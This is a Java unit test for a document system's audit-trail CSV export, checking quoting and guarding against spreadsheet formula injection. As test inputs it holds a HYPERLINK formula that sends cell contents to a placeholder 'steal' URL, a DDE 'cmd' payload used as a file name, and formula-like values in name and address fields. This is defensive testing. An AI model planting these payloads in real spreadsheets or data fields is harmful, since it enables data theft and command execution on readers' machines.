// SPDX-FileCopyrightText: 2026 The Healdan Project
// SPDX-License-Identifier: LGPL-3.0-only

package com.logicaldoc.healdan.admin.audit;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.StringWriter;
import java.io.Writer;
import java.sql.Timestamp;
import java.time.Instant;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import javax.sql.DataSource;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.springframework.jdbc.core.JdbcTemplate;

import com.logicaldoc.core.folder.Folder;
import com.logicaldoc.core.folder.FolderDAO;
import com.logicaldoc.core.security.Tenant;
import com.logicaldoc.core.security.user.User;
import com.logicaldoc.core.security.user.UserDAO;
import com.logicaldoc.healdan.AbstractHealdanTestCase;
import com.logicaldoc.healdan.admin.AdminArea;
import com.logicaldoc.healdan.admin.AdminContext;
import com.logicaldoc.healdan.admin.AdminEvent;
import com.logicaldoc.healdan.admin.AdminEvent.Change;
import com.logicaldoc.healdan.admin.AdminEvents;
import com.logicaldoc.healdan.admin.PersonNames;
import com.logicaldoc.healdan.matter.Matter;
import com.logicaldoc.healdan.support.HealdanFixtures;
import com.logicaldoc.healdan.support.LogCapture;
import com.logicaldoc.util.spring.Context;

/**
 * The Audit Trail's export (ruling P5-R15; the plan's Review Focus 3): every cell quoted where it must be, and guarded
 * so that a spreadsheet reads no cell as a formula, whoever typed the names in it; a secret's change as changed, with
 * no value; and a last line when it stops at its most rows.
 */
public class AuditCsvTest extends AbstractHealdanTestCase {

	/** What a spreadsheet may read as the start of a formula */
	private static final String DANGEROUS = "=+-@\t\r";

	private final HealdanFixtures fx = new HealdanFixtures();

	private JdbcTemplate jdbc;

	private User admin;

	@Before
	public void prepare() throws Exception {
		jdbc = new JdbcTemplate(Context.get(DataSource.class));
		admin = fx.admin();
	}

	@After
	public void forgetTheAddress() {
		AdminContext.clear();
	}

	@Test
	public void testACellStartingAFormulaIsGuarded() {
		assertEquals("'=1+1", AuditCsv.cell("=1+1"));
		assertEquals("'+1", AuditCsv.cell("+1"));
		assertEquals("'-1", AuditCsv.cell("-1"));
		assertEquals("'@SUM(A1)", AuditCsv.cell("@SUM(A1)"));
		assertEquals("'\tx", AuditCsv.cell("\tx"));
		assertEquals("\"'\rx\"", AuditCsv.cell("\rx"));
		assertEquals("\"'=HYPERLINK(\"\"http://example.com\"\",\"\"x\"\")\"",
				AuditCsv.cell("=HYPERLINK(\"http://example.com\",\"x\")"));
		// Only the first character counts
		assertEquals("a=1", AuditCsv.cell("a=1"));
		assertEquals(" =1", AuditCsv.cell(" =1"));
		assertEquals("", AuditCsv.cell(null));
		assertEquals("", AuditCsv.cell(""));
	}

	@Test
	public void testQuotesAndNewLinesAreEscaped() {
		assertEquals("plain", AuditCsv.cell("plain"));
		assertEquals("\"a,b\"", AuditCsv.cell("a,b"));
		assertEquals("\"say \"\"hi\"\"\"", AuditCsv.cell("say \"hi\""));
		assertEquals("\"one\ntwo\"", AuditCsv.cell("one\ntwo"));
		assertEquals("\"one\r\ntwo\"", AuditCsv.cell("one\r\ntwo"));
		assertEquals("it's", AuditCsv.cell("it's"));
		assertEquals("\"'=1,2\"", AuditCsv.cell("=1,2"));
	}

	@Test
	public void testChanges() {
		Map<String, Change> changes = new LinkedHashMap<>();
		changes.put("name", new Change("Wasabi", "Wasabi EU"));
		changes.put("note", new Change(null, "new"));
		changes.put("prefix", new Change("old", null));
		changes.put("secret", Change.secret());

		assertEquals("name: Wasabi \u2192 Wasabi EU\nnote: (none) \u2192 new\nprefix: old \u2192 (none)\nsecret: changed",
				AuditCsv.changes(changes));
		assertEquals("", AuditCsv.changes(null));
	}

	@Test
	public void testALine() {
		AuditRow row = new AuditRow("a1", Instant.parse("2026-11-22T10:44:07.12Z"), "Sam Okafor", "administration",
				"backend.changed", "Changed a backend", "Wasabi EU", "192.0.2.9", null, null,
				Map.of("secret", Change.secret(), "name", new Change("Wasabi", "Wasabi EU")));

		assertEquals("2026-11-22T10:44:07.120Z,Sam Okafor,Administration,Changed a backend,Wasabi EU,192.0.2.9,"
				+ "\"name: Wasabi \u2192 Wasabi EU\nsecret: changed\"\r\n", AuditCsv.line(row));

		AuditRow whole = new AuditRow("d1", Instant.parse("2026-11-22T10:44:07Z"), null, "sign-in",
				"event.user.login", "Signed in", null, null, null, null, null);
		assertEquals("2026-11-22T10:44:07.000Z,,Sign-In,Signed in,,,\r\n", AuditCsv.line(whole));
	}

	@Test
	public void testTheStoppedLine() {
		assertEquals("Stopped at 100,000 rows: narrow the filters to export the rest.",
				AuditCsv.stopped(AuditCsv.MAX_ROWS));
		assertEquals(100_000, AuditCsv.MAX_ROWS);
	}

	@Test
	public void testTheFile() throws Exception {
		jdbc.update("delete from ld_history");
		jdbc.update("delete from ld_folder_history");
		jdbc.update("delete from ld_user_history");
		jdbc.update("delete from hd_admin_event");
		for (int i = 0; i < 5; i++)
			jdbc.update("insert into hd_admin_event (hd_id, hd_tenantid, hd_date, hd_userid, hd_username, hd_area,"
					+ " hd_action, hd_targetkind, hd_targetname) values (?, 1, ?, 1, 'admin', 'MATTERS',"
					+ " 'client.renamed', 'client', ?)", 10 + i,
					Timestamp.from(Instant.parse("2026-11-22T10:00:00Z").plusSeconds(i)), "Client " + i);

		StringWriter all = new StringWriter();
		assertEquals(AuditCsv.End.COMPLETE, AuditCsv.write(AuditFeed.get().prepare(AuditQuery.all(2), admin), 5, all));
		StringWriter some = new StringWriter();
		assertEquals(AuditCsv.End.AT_MOST, AuditCsv.write(AuditFeed.get().prepare(AuditQuery.all(2), admin), 3, some));

		String text = all.toString();
		assertTrue(text.startsWith("\uFEFFTime,Who,Kind,What,Detail,From,Changes\r\n"));
		assertFalse(text.replace("\r\n", "").contains("\n"));
		List<List<String>> rows = parse(text.substring(1));
		assertEquals(6, rows.size());
		assertEquals(List.of("Time", "Who", "Kind", "What", "Detail", "From", "Changes"), rows.get(0));
		assertEquals(List.of("2026-11-22T10:00:04.000Z", PersonNames.of(admin), "Administration", "Renamed a client",
				"Client 4", "", ""), rows.get(1));
		assertEquals("Client 0", rows.get(5).get(4));

		List<List<String>> stopped = parse(some.toString().substring(1));
		assertEquals(5, stopped.size());
		assertEquals("Client 2", stopped.get(3).get(4));
		assertEquals(List.of("Stopped at 3 rows: narrow the filters to export the rest."), stopped.get(4));
		// It's a cell like any other: quoted only where it must be, as for 100,000, whose comma it holds
		assertTrue(some.toString().endsWith("\r\nStopped at 3 rows: narrow the filters to export the rest.\r\n"));
	}

	/**
	 * The header goes out at once, before any row (ruling P5-R32), and each page as it's written, so the client hears
	 * from the server however few rows a page keeps
	 */
	@Test
	public void testTheHeaderAndEachPageGoOutAtOnce() throws Exception {
		rows(5);
		Flushes out = new Flushes();

		assertEquals(AuditCsv.End.COMPLETE, AuditCsv.open(AuditFeed.get().prepare(AuditQuery.all(2), admin), 10, 2)
				.writeTo(out));

		String header = "\uFEFF" + AuditCsv.HEADER + "\r\n";
		assertEquals(header, out.flushed.get(0));
		// Then two rows a page: three pages, each flushed as it's written
		assertEquals(4, out.flushed.size());
		assertEquals(List.of(1, 3, 5, 6), out.flushed.stream().map(text -> text.split("\r\n").length).toList());
	}

	/** A later page that can't be read ends the file with a last line, logged once at error (ruling P5-R32) */
	@Test
	public void testAnExportThatCantFinishSaysSo() throws Exception {
		rows(5);
		StringWriter out = new StringWriter();
		AuditCsv.Export export = AuditCsv.open(AuditFeed.get().prepare(AuditQuery.all(2), admin), 10, 2);
		AuditTestHooks.failPage(1);
		AuditCsv.End end;
		try (LogCapture log = LogCapture.of(AuditCsv.class)) {
			end = export.writeTo(out);
			assertEquals(List.of("ERROR The Audit Trail's export stopped before its end:"
					+ " org.springframework.dao.DataAccessResourceFailureException"), log.lines());
		} finally {
			AuditTestHooks.reset();
		}

		assertEquals(AuditCsv.End.UNREADABLE, end);
		List<List<String>> lines = parse(out.toString().substring(1));
		// The header, the first page's two rows, and the last line
		assertEquals(4, lines.size());
		assertEquals(List.of(AuditCsv.UNREADABLE), lines.get(3));
		assertTrue(out.toString().endsWith("\r\n" + AuditCsv.UNREADABLE + "\r\n"));
	}

	/** Its reader is asked again at each page: one no longer an administrator gets no more rows (ruling P5-R32) */
	@Test
	public void testAnExportStopsOnceItsReaderIsNoLongerAnAdministrator() throws Exception {
		User boss = fx.user("boss", "admin");
		rows(5);
		StringWriter out = new StringWriter();
		AuditCsv.Export export = AuditCsv.open(AuditFeed.get().prepare(AuditQuery.all(2), boss), 10, 2);
		jdbc.update("delete from ld_usergroup where ld_userid = ? and ld_groupid in (select ld_id from ld_group"
				+ " where ld_name = 'admin')", boss.getId());

		assertEquals(AuditCsv.End.NOT_ADMIN, export.writeTo(out));

		List<List<String>> lines = parse(out.toString().substring(1));
		assertEquals(4, lines.size());
		assertEquals(List.of(AuditCsv.NOT_ADMIN), lines.get(3));
	}

	/** Only the administration record's rows, five of them, a second apart */
	private void rows(int count) {
		jdbc.update("delete from ld_history");
		jdbc.update("delete from ld_folder_history");
		jdbc.update("delete from ld_user_history");
		jdbc.update("delete from hd_admin_event");
		for (int i = 0; i < count; i++)
			jdbc.update("insert into hd_admin_event (hd_id, hd_tenantid, hd_date, hd_userid, hd_username, hd_area,"
					+ " hd_action, hd_targetkind, hd_targetname) values (?, 1, ?, 1, 'admin', 'MATTERS',"
					+ " 'client.renamed', 'client', ?)", 10 + i,
					Timestamp.from(Instant.parse("2026-11-22T10:00:00Z").plusSeconds(i)), "Client " + i);
	}

	/** Text written, as it stood at each flush */
	private static final class Flushes extends Writer {

		private final StringBuilder text = new StringBuilder();

		final List<String> flushed = new ArrayList<>();

		@Override
		public void write(char[] buffer, int offset, int length) {
			text.append(buffer, offset, length);
		}

		@Override
		public void flush() {
			flushed.add(text.toString());
		}

		@Override
		public void close() {
		}
	}

	@Test
	public void testHostileTextInEveryColumnIsNeverAFormula() throws Exception {
		String formula = "=HYPERLINK(\"http://example.com/steal?\"&A1,\"Open\")";
		User mallory = fx.user("mallory", "admin");
		mallory.setFirstName(formula);
		mallory.setName("-2+3");
		UserDAO.get().store(mallory);
		Folder store = fx.store("Client Work");
		Matter matter = fx.matter(fx.client(1001, "Ashcombe"), 1, "Charter Dispute", store, "Documents");
		Folder documents = FolderDAO.get().findByName(FolderDAO.get().findById(matter.getFolderId()), "Documents",
				Tenant.DEFAULT_ID, true).get(0);
		Folder folder = fx.folder(documents, "@SUM(A1:A9)", mallory);
		fx.upload(folder, "+cmd|' /C calc'!A0.docx", "x", mallory);
		HealdanFixtures.awaitVersionSaves();
		// Rows that hold the name: the folder's path, a sign-in from an address and a device, and a comment
		jdbc.update("insert into ld_user_history (ld_id, ld_lastmodified, ld_creation, ld_recordversion, ld_deleted,"
				+ " ld_tenantid, ld_notified, ld_date, ld_userid, ld_username, ld_event, ld_ip, ld_device, ld_comment)"
				+ " values (900001, current_timestamp, current_timestamp, 1, 0, 1, 0, current_timestamp, ?, ?,"
				+ " 'event.user.login', '=1+2', '\tSafari', null)", mallory.getId(), "@mallory");
		// A change to an account no account has now, by an author no account has: both named as the row kept them
		jdbc.update("insert into ld_user_history (ld_id, ld_lastmodified, ld_creation, ld_recordversion, ld_deleted,"
				+ " ld_tenantid, ld_notified, ld_date, ld_userid, ld_username, ld_event, ld_ip, ld_comment, ld_author)"
				+ " values (900002, current_timestamp, current_timestamp, 1, 0, 1, 0, current_timestamp, 987654,"
				+ " '-mallory', 'event.user.updated', ?, '+comment', '@author')", "\r=cmd");
		jdbc.update("update ld_folder_history set ld_path = ? where ld_folderid = ?", "+" + formula, folder.getId());
		// An administration row aimed at a name, from an address, with a changed secret and a hostile field
		AdminContext.set("@192.0.2.1");
		AdminEvents.get().record(new AdminEvent(AdminArea.MATTERS, "folder.properties-changed", "folder",
				folder.getId(), formula, Map.of("=Due", new Change("-1", formula), "secret", Change.secret())), mallory);
		AdminContext.clear();

		StringWriter out = new StringWriter();
		AuditCsv.write(AuditFeed.get().prepare(AuditQuery.all(50), admin), AuditCsv.MAX_ROWS, out);

		List<List<String>> rows = parse(out.toString().substring(1));
		List<String> cells = new ArrayList<>();
		rows.subList(1, rows.size()).forEach(cells::addAll);
		for (String cell : cells)
			assertTrue("A cell a spreadsheet could read as a formula: " + cell,
					cell.isEmpty() || DANGEROUS.indexOf(cell.charAt(0)) < 0);
		// Each hostile cell is there, with the guard before it
		assertTrue(cells.toString(), cells.contains("'" + formula + " -2+3"));
		assertTrue(cells.toString(), cells.contains("'" + formula));
		assertTrue(cells.toString(), cells.contains("'+" + formula));
		assertTrue(cells.toString(), cells.contains("'@192.0.2.1"));
		assertTrue(cells.toString(), cells.contains("'=1+2"));
		assertTrue(cells.toString(), cells.contains("'\tSafari"));
		assertTrue(cells.toString(), cells.contains("'\r=cmd"));
		assertTrue(cells.toString(), cells.contains("'-mallory: +comment"));
		assertTrue(cells.toString(), cells.contains("'@author"));
		assertTrue(cells.toString(), cells.stream().anyMatch(cell -> cell.startsWith("# ")
				&& cell.contains(", +cmd|' /C calc'!A0.docx, version 1.0")));
		assertTrue(cells.toString(), cells.contains("'=Due: -1 \u2192 " + formula + "\nsecret: changed"));
	}

	/**
	 * @return the CSV's lines, each as its cells, read as a spreadsheet reads them: quoted cells with their quotes
	 *         doubled, and lines that end in CR LF
	 */
	static List<List<String>> parse(String csv) {
		List<List<String>> lines = new ArrayList<>();
		List<String> line = new ArrayList<>();
		StringBuilder cell = new StringBuilder();
		boolean quoted = false;
		for (int i = 0; i < csv.length(); i++) {
			char c = csv.charAt(i);
			if (quoted) {
				if (c == '"' && i + 1 < csv.length() && csv.charAt(i + 1) == '"') {
					cell.append('"');
					i++;
				} else if (c == '"') {
					quoted = false;
				} else {
					cell.append(c);
				}
			} else if (c == '"' && cell.isEmpty()) {
				quoted = true;
			} else if (c == ',') {
				line.add(cell.toString());
				cell.setLength(0);
			} else if (c == '\r' && i + 1 < csv.length() && csv.charAt(i + 1) == '\n') {
				line.add(cell.toString());
				cell.setLength(0);
				lines.add(line);
				line = new ArrayList<>();
				i++;
			} else {
				assertFalse("A bare line end or quote outside a quoted cell at " + i, c == '\n' || c == '"');
				cell.append(c);
			}
		}
		assertFalse("The file ends inside a quoted cell", quoted);
		assertTrue("The file's last line ends in CR LF", line.isEmpty() && cell.isEmpty());
		return lines;
	}
}
